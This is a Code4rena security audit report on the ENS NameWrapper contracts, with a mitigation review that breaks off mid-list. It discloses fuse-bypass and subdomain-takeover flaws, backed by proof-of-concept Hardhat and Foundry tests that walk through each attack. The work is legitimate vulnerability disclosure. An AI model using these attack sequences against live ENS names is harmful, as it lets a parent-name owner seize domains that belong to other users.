# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the ENS smart contract system written in Solidity. The audit took place between November 22â€”November 28 2022.

Following the C4 audit, the participating wardens reviewed the mitigations for all identified issues; the mitigation review report is appended below the audit report.

## Wardens

In Code4rena's Invitational audits, the competition is limited to a small group of wardens; for this audit, 3 wardens contributed reports:

  1. [csanuragjain](https://twitter.com/csanuragjain)
  2. [izhuer](https://www.cs.purdue.edu/homes/zhan3299/index.html)
  3. zzzitron

This audit was judged by [Alex the Entreprenerd](https://twitter.com/GalloDaSballo).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 5 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 3 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 3 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 ENS audit repository](https://github.com/code-423n4/2022-11-ens), and is composed of 7 smart contracts written in the Solidity programming language and includes 1,179 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (2)
## [[H-01] `PARENT_CANNOT_CONTROL` and `CANNOT_CREATE_SUBDOMAIN` fuses can be bypassed](https://github.com/code-423n4/2022-11-ens-findings/issues/14)
*Submitted by [izhuer](https://github.com/code-423n4/2022-11-ens-findings/issues/14)*

The fuse constraints can be violated by a malicious owner of the parent node (i.e., the hacker). There are two specific consequences the hacker can cause.

*   Suppose the subnode has been assigned to a victim user, the hacker can re-claim him as the owner of the subnode even if the `PARENT_CANNOT_CONTROL` of the subnode has been burnt.
*   Suppose the owner of the subnode remains to be the hacker, he can create sub-subnode even if the `CANNOT_CREATE_SUBDOMAIN` of the subnode has been burnt.

Basically, ENS NameWrapper uses the following rules to prevent all previous C4 hacks (note that I will assume the audience has some background regarding the ENS codebase).

*   The `PARENT_CANNOT_CONTROL` fuse of a subnode can be burnt if and only if the `CANNOT_UNWRAP` fuse of its parent has already been burnt.
*   The `CANNOT_UNWRAP` fuse of a subnode can be burnt if and only if its `PARENT_CANNOT_CONTROL` fuse has already been burnt.

However, such guarantees would only get effective when the `CANNOT_UNWRAP` fuse of the subject node is burnt.

Considering the following scenario.

1.  `sub1.eth` (the ETH2LD node) is registered and wrapped to the hacker - *the ENS registry owner, i.e., `ens.owner`, of `sub1.eth` is the NameWrapper contract.*

2.  `sub2.sub1.eth` is created with no fuses burnt, where the wrapper owner is still the hacker - *the ENS registry owner of `sub2.sub1.eth` is the NameWrapper contract.*

3.  `sub3.sub2.sub1.eth` is created with no fuses burnt and owned by a victim user - *the ENS registry owner of `sub3.sub2.sub1.eth` is the NameWrapper contract.*

4.  the hacker unwraps `sub2.sub1.eth` - *the ENS registry owner of `sub2.sub1.eth` becomes the hacker.*

5.  via ENS registry, the hacker claims himself as the ENS registry owner of `sub3.sub2.sub1.eth`. Note that the `sub3.sub2.sub1.eth` in the NameWrapper contract remains valid till now - *the ENS registry owner of `sub3.sub2.sub1.eth` is the hacker.*

6.  the hacker wraps `sub2.sub1.eth` - *the ENS registry owner of `sub2.sub1.eth` becomes the NameWrapper contract.*

7.  the hacker burns the `PARENT_CANNOT_CONTROL` and `CANNOT_UNWRAP` fuses of `sub2.sub1.eth`.

8.  the hacker burns the `PARENT_CANNOT_CONTROL`, `CANNOT_UNWRAP`, and `CANNOT_CREATE_SUBDOMAIN` fuses of `sub3.sub2.sub1.eth`. **Note that the current ENS registry owner of `sub3.sub2.sub1.eth` remains to be the hacker**

At this stage, things went wrong.

Again, currently the `sub3.sub2.sub1.eth` is valid in NameWrapper w/ `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN` burnt, but the ENS registry owner of `sub3.sub2.sub1.eth` is the hacker.

The hacker can:

*   invoke `NameWrapper::wrap` to wrap `sub3.sub2.sub1.eth`, and re-claim himself as the owner of `sub3.sub2.sub1.eth` in NameWrapper.
*   invoke `ENSRegistry::setSubnodeRecord` to create `sub4.sub3.sub2.sub1.eth` and wrap it accordingly, violating `CANNOT_CREATE_SUBDOMAIN`

### Proof of Concept

The `poc_ens.js` file (included in [warden's original submission](https://github.com/code-423n4/2022-11-ens-findings/issues/14)) demonstrates the above hack, via 6 different attack paths.

To validate the PoC, put the file in `./test/wrapper` and run `npx hardhat test test/wrapper/poc_ens.js`

### Recommended Mitigation Steps

The `NameWrapper.sol` file (included in [warden's original submission](https://github.com/code-423n4/2022-11-ens-findings/issues/14)) demonstrates the patch.

In short, we try to guarantee only fuses of **wrapped** nodes can be burnt.

## [[H-02] During the deprecation period where both .eth registrar controllers are active, a crafted hack can be launched and cause the same malicious consequences of [H-01] even if [H-01] is properly fixed](https://github.com/code-423n4/2022-11-ens-findings/issues/16)
*Submitted by [izhuer](https://github.com/code-423n4/2022-11-ens-findings/issues/16)*

Specifically, according to the [documentation](https://github.com/ensdomains/ens-contracts/tree/master/contracts/wrapper#register-wrapped-names), there will be a deprecation period that two types of .eth registrar controllers are active.

> Names can be registered as normal using the current .eth registrar controller. However, the new .eth registrar controller will be a controller on the NameWrapper, and have NameWrapper will be a controller on the .eth base registrar.

> Both .eth registrar controllers will be active during a deprecation period, giving time for front-end clients to switch their code to point at the new and improved .eth registrar controller.

The current .eth registrar controller can directly register ETH2LD and send to the user, while the new one will automatically wrap the registered ETH2LD.

If the two .eth registrar controllers are both active, an ETH2LD node can be **implicitly** unwrapped while the NameWrapper owner remains to be the hacker.

**Note that this hack can easily bypass the patch of \[H-01].**

Considering the following situtation.

*   the hacker registered and wrapped an ETH2LD node `sub1.eth`, with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` burnt. The ETH2LD will be expired shortly and can be re-registred within the aformentioned deprecation period.

*   after `sub1.eth` is expired, the hacker uses the current .eth registrar controller to register `sub1.eth` to himself.
    *   *at this step, the `sub1.eth` is implicitly unwrapped*.
    *   the hacker owns the registrar ERC721 as well as the one of ENS registry for `sub1.eth`.
    *   however, `sub1.eth` in NameWrapper remains valid.

*   he sets `EnsRegistry.owner` of `sub1.eth` as NameWrapper.
    *   note that **this is to bypass the proposed patch for \[H-01].**

*   he wraps `sub2.sub1.eth` with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` and trafers it to a victim user.

*   he uses `BaseRegistrar::reclaim` to become the `EnsRegistry.owner` of `sub1.eth`
    *   at this step, the hack can be launched as **\[H-01]** does.

For example,

*   he can first invokes `EnsRegistry::setSubnodeOwner` to become the owner of `sub2.sub1.eth`

*   he then invokes `NameWrapper::wrap` to wrap `sub2.sub1.eth` to re-claim as the owner.

**Note that it does not mean the impact of the above hack is limited in the deprecation period**.

What the hacker needs to do is to re-registers `sub1.eth` via the old .eth registrar controller (in the deprecation period). He can then launch the attack any time he wants.

### Proof of Concept

```js
    it('Attack happens within the deprecation period where both .eth registrar controllers are active', async () => {
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        1 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )

      // wait the ETH2LD expired and re-register to the hacker himself
      await evm.advanceTime(GRACE_PERIOD + 1 * DAY + 1)
      await evm.mine()

      // XXX: note that at this step, the hackler should use the current .eth
      // registrar to directly register `sub1.eth` to himself, without wrapping
      // the name.
      await BaseRegistrar.register(labelHash1, hacker, 10 * DAY)
      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)

      // set `EnsRegistry.owner` as NameWrapper. Note that this step is used to
      // bypass the newly-introduced checks for [H-01]
      //
      // XXX: corrently, `sub1.eth` becomes a normal node
      await EnsRegistryH.setOwner(wrappedTokenId1, NameWrapper.address)

      // create `sub2.sub1.eth` to the victim user with `PARENT_CANNOT_CONTROL`
      // burnt.
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId1,
        label2,
        account2,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(account2)

      // XXX: reclaim the `EnsRegistry.owner` of `sub1.eth` as the hacker
      await BaseRegistrarH.reclaim(labelHash1, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)
      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)

      // reset the `EnsRegistry.owner` of `sub2.sub1.eth` as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)

      // wrap `sub2.sub1.eth` to re-claim as the owner
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)
    })
```

### Recommended Mitigation Steps

May need to discuss with ENS team. A naive patch is to check whther a given ETH2LD node is indeed wrapped every time we operate it. However, it is not gas-friendly.

# Medium Risk Findings (3)
## [[M-01] NameWrapper: Cannot prevent transfer while upgrade even with `CANNOT_TRANSFER` fuse regardless of the upgraded NameWrapper's implementation](https://github.com/code-423n4/2022-11-ens-findings/issues/6)
*Submitted by [zzzitron](https://github.com/code-423n4/2022-11-ens-findings/issues/6)*

<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L408><br>
<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L436>

Upon upgrade to a new `NameWrapper` contract, `owner` of the node will be set to the given `wrappedOwner`. Since the node will be `_burn`ed before calling the upgraded NameWrapper, the upgraded NameWrapper cannot check the old owner. Therefore, no matter the upgraded NameWrapper's implementation, it locks the information to check whether the old owner and newly given `wrappedOwner` are the same. If they are not the same, it means basically transferring the name to a new address.

In the case of resolver, the upgraded NameWrapper can check the old resolver by querying to the `ENS` registry, and prevent changing it if `CANNOT_SET_RESOLVER` fuse is burned.

### Proof of Concept

Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.

The proof of concept below demonstrates upgrade process.

```solidity
// https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol-L215-L243
    function testM2TransferWhileUpgrade() public {
        // using the mock for upgrade contract
        deployNameWrapperUpgrade();
        string memory node_str = 'vitalik.eth';
        string memory sub1_full = 'sub1.vitalik.eth';
        string memory sub1_str = 'sub1';
        (, bytes32 node) = node_str.dnsEncodeName();
        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();

        // wrap parent and lock
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, type(uint16).max /* all fuses are burned */, address(0));
        // sanity check
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | type(uint16).max);
        assertEq(expiry, 2038123728);

        // upgrade as nameWrapper's owner
        vm.prank(root_owner);
        nameWrapper.setUpgradeContract(nameWrapperUpgrade);
        assertEq(address(nameWrapper.upgradeContract()), address(nameWrapperUpgrade));

        // user1 calls upgradeETH2LD
        vm.prank(user1);
        nameWrapper.upgradeETH2LD('vitalik', address(123) /* new owner */, address(531) /* resolver */);
    }
```

Even if the `CANNOT_TRANSFER` fuse is in effect, the user1 can call `upgradeETH2LD` with a new owner.

Before the `NameWrapper.upgradeETH2LD` calls the new upgraded NameWrapper `upgradeContract`, it calls `_prepareUpgrade`, which burns the node in question. It means, the current `NameWrapper.ownerOf(node)` will be zero.

The upgraded NameWrapper has only the given `wrappedOwner` which is supplied by the user, which does not guarantee to be the old owner (as the proof of concept above shows). As the ens registry and ETH registrar also do not have any information about the old owner, the upgraded NameWrapper should probably set the owner of the node to the given `wrappedOwner`, even if `CANNOT_TRANSFER` fuse is in effect.

On contrary to the owner, although `resolver` is given by the user on the `NameWrapper.upgradeETH2LD` function, it is possible to prevent changing it if the `CANNOT_SET_RESOLVER` fuse is burned, by querying to `ENSRegistry`.

```solidity
// NameWrapper

 408     function upgradeETH2LD(
 409         string calldata label,
 410         address wrappedOwner,
 411         address resolver
 412     ) public {
 413         bytes32 labelhash = keccak256(bytes(label));
 414         bytes32 node = _makeNode(ETH_NODE, labelhash);
 415         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);
 416
 417         upgradeContract.wrapETH2LD(
 418             label,
 419             wrappedOwner,
 420             fuses,
 421             expiry,
 422             resolver
 423         );
 424     }

 840     function _prepareUpgrade(bytes32 node)
 841         private
 842         returns (uint32 fuses, uint64 expiry)
 843     {
 844         if (address(upgradeContract) == address(0)) {
 845             revert CannotUpgrade();
 846         }
 847
 848         if (!canModifyName(node, msg.sender)) {
 849             revert Unauthorised(node, msg.sender);
 850         }
 851
 852         (, fuses, expiry) = getData(uint256(node));
 853
 854         _burn(uint256(node));
 855     }
```

The function `NameWrapper.upgrade` has the same problem.

```solidity
// NameWrapper
 436     function upgrade(
 437         bytes32 parentNode,
 438         string calldata label,
 439         address wrappedOwner,
 440         address resolver
 441     ) public {
 442         bytes32 labelhash = keccak256(bytes(label));
 443         bytes32 node = _makeNode(parentNode, labelhash);
 444         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);
 445         upgradeContract.setSubnodeRecord(
 446             parentNode,
 447             label,
 448             wrappedOwner,
 449             resolver,
 450             0,
 451             fuses,
 452             expiry
 453         );
 454     }
```

### Tools Used

foundry

### Recommended Mitigation Steps

If the `CANNOT_TRANSFER` fuse is set, enforce the `wrappedOwner` to be same as the `NameWrapper.ownerOf(node)`.

If the NameWrapper needed to be upgraded for any reason, the old resolver would be checking the old NameWrapper, and since the owner would be burnt, they would lock all records.

## [[M-02] NameWrapper: expired names behave unwrapped](https://github.com/code-423n4/2022-11-ens-findings/issues/7)
*Submitted by [zzzitron](https://github.com/code-423n4/2022-11-ens-findings/issues/7)*

<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512><br>

### Impact

*   expired Names are supposed to be unregistered, but it behaves like unwrapped
*   parent with `CANNOT_CREATE_SUBDOMAIN` fuse can "create" again an expired name
*   parent can `ENS.setSubdomainOwner` before burning `CANNOT_CREATE_SUBDOMAIN` to be able to use the subdomain later

### Proof of Concept

Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.

As in the `wrapper/README.md`:

> To check if a name is Unregistered, verify that `NameWrapper.ownerOf` returns `address(0)` and so does `Registry.owner`.<br>
> To check if a name is Unwrapped, verify that `NameWrapper.ownerOf` returns `address(0)` and `Registry.owner` does not.

Also, an expired name should go to Unregistered state per the graph suggests.

But, as the proof of concept below shows, after expiration, `NameWrapper.ownerOf(node)` is zero but `ens.owner(node)` is not zero. It is `Unwrapped` state based on the `wrapper/README.md`.

```solidity
    function testM3ExpiredNamesBehavesUnwrapped() public {
        string memory str_node = 'vitalik.eth';
        (bytes memory dnsName, bytes32 node) = str_node.dnsEncodeName();
        // before wrapping the name check
        assertEq(user1, ens.owner(node));
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, address(0));

        // -- wrapETH2LD
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, 0, address(0));
        // after name wrap check
        (owner, fuses, expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH);
        assertEq(expiry, 2038123728);
        // wrapETH2LD --

        vm.warp(2038123729);
        // after expiry
        (owner, fuses, expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, address(0));
        assertEq(fuses, 0);
        assertEq(expiry, 2038123728);
        assertEq(nameWrapper.ownerOf(uint256(node)), address(0));
        assertEq(ens.owner(node), address(nameWrapper)); // registry.owner is not zero
        vm.expectRevert();
        registrar.ownerOf(uint256(node));
    }
```

Since an expired name is technically unwrapped, even a parent with `CANNOT_CREATE_SUBDOMAIN` can set the owner or records of the subdomain as the proof of concept below shows.

```solidity
    function testM3ExpiredNameCreate() public {
        // After expired, the ens.owner's address is non-zero
        // therefore, the parent can 'create' the name evne CANNOT_CREATE_SUBDOMAIN is burned
        string memory parent = 'vitalik.eth';
        string memory sub1_full = 'sub1.vitalik.eth';
        string memory sub1 = 'sub1';
        (, bytes32 parent_node) = parent.dnsEncodeName();
        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();

        // wrap parent and lock
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));
        // checks
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);
        assertEq(expiry, 2038123728);

        // create subnode
        vm.prank(user1);
        nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, user2);
        assertEq(fuses, PARENT_CANNOT_CONTROL);
        assertEq(expiry, 1700000000);

        // now parent cannot create subdomain
        vm.prank(user1);
        nameWrapper.setFuses(parent_node, uint16(CANNOT_CREATE_SUBDOMAIN));
        (owner, fuses, expiry) = nameWrapper.getData(uint256(parent_node));
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN);
        // parent: pcc cu CANNOT_CREATE_SUBDOMAIN
        // child: pcc
        // unwrap and sets the owner to zero

        // parent cannot use setSubnodeRecord on PCCed sub
        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);

        // expire sub1
        vm.warp(1700000001);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(0));
        assertEq(fuses, 0);
        assertEq(expiry, 1700000000);
        assertEq(ens.owner(sub1_node), address(nameWrapper));

        // user1 can re-"create" sub1 even though CANNOT_CREATE_SUBDOMAIN is set on parent
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, address(3), address(11), 10, 0, 0);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(3));
        assertEq(fuses, 0);
        assertEq(expiry, 1700000000);
        assertEq(ens.owner(sub1_node), address(nameWrapper));

        // comparison: tries create a new subdomain and revert
        string memory sub2 = 'sub2';
        string memory sub2_full = 'sub2.vitalik.eth';
        (, bytes32 sub2_node) = sub2_full.dnsEncodeName();
        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub2_node));
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub2, user2, address(11), 10, 0, 0);
    }
```

### Tools Used

### Recommended Mitigation Steps

Unclear as the `NameWrapper` cannot set ENS.owner after expiration automatically.

## [[M-03] NameWrapper: Wrapped to Unregistered to ignore `PARENT_CANNOT_CONTROL`](https://github.com/code-423n4/2022-11-ens-findings/issues/8)
*Submitted by [zzzitron](https://github.com/code-423n4/2022-11-ens-findings/issues/8)*

<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512><br>
<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550>

### Impact

*   owner of a wrapped node without `CANNOT_UNWRAP` fuse can unwrap and set the `ens.owner(node)` to zero to be an unregistered state
*   if it happens, even if the node has `PARENT_CANNOT_CONTROL` fuse, the parent of the node can change the `NameWrappwer.owner` of the node

### Proof of Concept

Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.

In the proof of concept below, the parent node is `vitalik.eth` and the child node is `sub1.vitalik.eth`.<br>
The parent node has `PARENT_CANNOT_CONTROL`, `IS_DOT_ETH` and `CANNOT_UNWRAP` and the child node has `PARENT_CANNOT_CONTROL`.

The child node unwraps itself and set the owner on `ens` contract to the `address(0)` or `address(ens)`, which will make the child node to unregistered state even before expiry of the node.

Since technically the child node is unregistered, the parent can now 'create' the 'unregistered' node `sub1.vitalik.eth` by simply calling `setSubnodeRecord`. By doing so, the parent can take control over the child node, even though the `PARENT_CANNOT_CONTROL` fuse was set and it was before expiry.

```solidity
    function testM4WrappedToUnregistered() public {
        string memory parent = 'vitalik.eth';
        string memory sub1_full = 'sub1.vitalik.eth';
        string memory sub1 = 'sub1';
        (, bytes32 parent_node) = parent.dnsEncodeName();
        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();

        // wrap parent and lock
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));
        // checks
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);
        assertEq(expiry, 2038123728);

        // subnode
        vm.prank(user1);
        nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, user2);
        assertEq(fuses, PARENT_CANNOT_CONTROL);
        assertEq(expiry, 1700000000);

        // parent cannot set record on the sub1
        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);

        // parent: pcc cu
        // child: pcc

        // unwrap sub and set the ens owner to zero -> now parent can change owner
        vm.prank(user2);
        nameWrapper.unwrap(parent_node, _hashLabel(sub1), address(ens));
        assertEq(ens.owner(sub1_node), address(0));

        // sub node has PCC but parent can set owner, resolve and ttl
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, address(246), address(12345), 111111, 0, 0);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(246));
        assertEq(fuses, PARENT_CANNOT_CONTROL);
        assertEq(expiry, 1700000000);
        assertEq(ens.resolver(sub1_node), address(12345));
        assertEq(ens.ttl(sub1_node), 111111);

        // can change fuse as the new owner of sub1
        vm.prank(address(246));
        nameWrapper.setFuses(sub1_node, uint16(CANNOT_UNWRAP));
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(246));
        assertEq(fuses, PARENT_CANNOT_CONTROL | CANNOT_UNWRAP);
        assertEq(expiry, 1700000000);
        assertEq(ens.resolver(sub1_node), address(12345));
        assertEq(ens.ttl(sub1_node), 111111);
    }
```

It is unlikely that the child node will set the owner of the ENS Registry to zero. But hypothetically, the owner of the child node wanted to "burn" the subnode thinking that no one can use it until the expiry. In that case the owner of the parent node can just take over the child node.

### Tools Used

### Recommended Mitigation Steps

Unclear, but consider using `ENS.recordExists` instead of checking the `ENS.owner`.

# Low Risk and Non-Critical Issues

For this audit, 3 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-11-ens-findings/issues/9) by **zzzitron** received the top score from the judge.

*The following wardens also submitted reports: [izhuer](https://github.com/code-423n4/2022-11-ens-findings/issues/17) and [csanuragjain](https://github.com/code-423n4/2022-11-ens-findings/issues/12).*

## L-01 NameWrapper: Missing `isWrapped` function

According to the `wrapper/README.md`:

> To check if a name has been wrapped, call `isWrapped()`. This checks:
> 
> - The NameWrapper is the owner in the Registry contract
> - The owner in the NameWrapper is non-zero

However, there is no implementation of the `isWrapped()` function.

## L-02 NameWrapper: `upgrade` does not revert when called with ETH2LD

The `NameWrapper.upgrade` function is supposed to be called only by non .eth domain, based on the comment. However, it currently lacks the check whether the given `parentNode` is not the `ETH_NODE`, and it allows to be called by .eth node as the proof of concept shows.

This is, however, reported as QA, assuming the upgraded NameWrapper has some logic to check the parentNode is not `ETH_NODE`.
Nevertheless, to ensure that no .eth node can be called with `NameWrapper.upgrade`, it is probably good to have the check on the current NameWrapper.

# Mitigation Review

## Introduction

Following the C4 audit audit, the three participating wardens reviewed the mitigations for all identified issues. Additional details can be found within the [C4 ENS Mitigation Review repository](https://github.com/code-423n4/2022-12-ens-mitigation).

## Overview of Changes

**Summary from the Sponsor:**

> The mitigations were grouped into 4 separate PRs. Subnode related issues (M-02/M-03) were grouped together as their mitigations were interrelated and we wanted to make sure one mitigation didn't break the other.

> For the H-01 and H-02 the main issue was related to implied unwrapping. Implied unwrapping are probably the most dangerous of all the bugs within the Name Wrapper as they involve calling contracts outside of the Name Wrapper to take control over a name that should be protected under fuses, expiry or both. Both the registry and the .eth registrar contracts have no awareness of the wrapper and therefore ignore all protections. This means we must be careful about what we consider a wrapped name. By detecting situations where a name *could* be taken over by these wrapper unaware contracts and forcing a state that makes them either unwrapped OR unable to change the state within the wrapper we can protect against these kinds of attacks. The mitigations redefine what it means to be wrapped for both .eth names and normal names. The wrapper will now check if a name both has an owner in the wrapper AND the owner in the registry is the wrapper. For .eth names we also add an additional requirement of the wrapper needing to be the owner in the .eth registrar. To accomplish this we zero out the owner in getData() if the wrapper is not the owner.

> M-01 the mitigation we treat the upgrading of a name to a different owner as a transfer and call `_preTransferCheck()` if we detect it is going to a different owner. 

> M-02 and M-03 are related to the state of a subname. They highlighted we needed tighter constraints on what we consider an uncreated subname. Previously expired names would still be considered created (and therefore in the unwrapped state) and therefore could be taken over by a parent that had `CANNOT_CREATE_SUBDOMAINS` burnt already. The general mitigation for M-02 and M-03 was to change the logic so names need to be expired before they can be considered "Unregistered". For M-02 we ensure that names that have an owner in the registry are considered as created. For M-03 we ensure that names that have been burned (ownerOf returns 0 and registry.owner returns 0) are considered created until the name itself expires. The initial mitigation also broke the ability for the subname to be protected under PCC as when ownerOf returned 0, the name is considered uncreated/unregistered and therefore the parent could also recreate it. To ensure this constraint is maintained, we also check that the name is also expired when ownerOf returns 0.

Unanimously confirmed by all three participating wardens. See [csanuragjain's comment](https://github.com/code-423n4/2022-11-ens-findings/issues/14#issuecomment-1376912097) on the original finding.

## [[MR-H-02] The patch is not sufficient: there is another insidious exploit that can cause the same critical consequences](https://github.com/code-423n4/2022-12-ens-mitigation-findings/issues/12)
*Submitted by [izhuer](https://github.com/code-423n4/2022-12-ens-mitigation-findings/issues/12)*

### Lines of code

https://github.com/ensdomains/ens-contracts/blob/69af5ea4fa1bb21a3ef240dd219b574d0e207421/contracts/wrapper/NameWrapper.sol#L137-L140

### Status

Has been reported to and confirmed by Jeff (ENS team)

### Note to the Judge

I am not sure whether I should label this as a _newly-identified High_ or a _mitigation hard error_. The root cause of this issue seems as same as the original report, but this requires us to write a more sophisticated (and creative) exploit. (maybe mitigation hard error?)

### Description

The basic root cause of [__H-02__](https://github.com/code-423n4/2022-11-ens-findings/issues/16) is implied unwrapping, where the hacker can re-register an ETH2LD node (to himself) via the old  .eth registrar controller after the ETH2LD's expiration. As a result, the hacker can implicitly unwrap any sub-domains regardless of their burnt fuses. 

The following check was added to validate whether an ETH2LD is wrapped or not.

```solidity
            if (
                registrarExpiry > block.timestamp &&
                registrar.ownerOf(uint256(labelHash)) != address(this)
            ) {
                owner = address(0);
            }
```

For the attack strategy we provided in the original report (which is most intuitive), the patch is sufficient. 

However, after checking the mitigation deeper, I observe there is another insidious attack strategy that can bypass the current patch.

Note that the current patch only checks the the registrar owner (i.e., `registrar.ownerOr`) but not the registry owner (i.e., `ens.owenr`) for an ETH2LD.

As a result, if the hacker sets the registrar owner (i.e., `registrar.ownerOr`) as the NameWrapper contract but leave the registry owner (i.e., `ens.owner`) as the hacker himself, he is able to launch an implied unwrapping later.
 
The hacker can launch the attack as follows.

+ leverage `registerAndWrapETH2LD` to register `sub1.eth` (i.e., register the name via new controller contract so it is a wrapped .eth)

+ create `sub2.sub1.eth` to the hacker himself w/o fuses burnt (i.e., create sub-name)

